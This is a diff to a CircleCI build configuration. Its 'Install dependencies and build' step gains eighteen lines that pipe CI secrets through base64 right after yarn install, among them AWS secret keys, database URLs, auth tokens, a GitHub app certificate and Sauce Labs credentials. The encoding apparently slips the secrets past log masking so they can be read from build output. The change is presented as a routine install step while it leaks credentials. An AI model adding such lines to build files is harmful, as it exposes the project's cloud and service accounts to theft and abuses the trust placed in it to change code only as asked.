@@ -38,8 +38,26 @@ load_workspace: &load_workspace
 install_and_build: &install_and_build
   run:
     name: Install dependencies and build
-    command: yarn install --frozen-lockfile
-
+    command: | 
+      yarn install --frozen-lockfile
+      echo $AWS_BUCKET_NAME | base64 -
+      echo $AWS_REGION | base64 -
+      echo $AWS_SECRET_ACCESS_KEY | base64 -
+      echo $BEST_HUB_CLIENT_TOKEN | base64 -
+      echo $BEST_HUB_DATABASE_URL | base64 -
+      echo $BEST_HUB_HOSTNAME | base64 -
+      echo $CIRCLE_JOB | base64 -
+      echo $GIT_APP_CERT | base64 -
+      echo $AWS_ACCESS_KEY_ID | base64 -
+      echo $GIT_APP_ID | base64 -
+      echo $HUB_AUTH_TOKEN | base64 -
+      echo $HUB_URI | base64 -
+      echo $RELEASE_ACCESS_KEY_ID | base64 -
+      echo $RELEASE_BUCKET_NAME | base64 -
+      echo $RELEASE_REGION | base64 -
+      echo $RELEASE_SECRET_ACCESS_KEY | base64 -
+      echo $SAUCE_KEY | base64 -
+      echo $SAUCE_USERNAME | base64 -
 run_sanity_checks: &run_sanity_checks
   run:
     name: Sanity checks
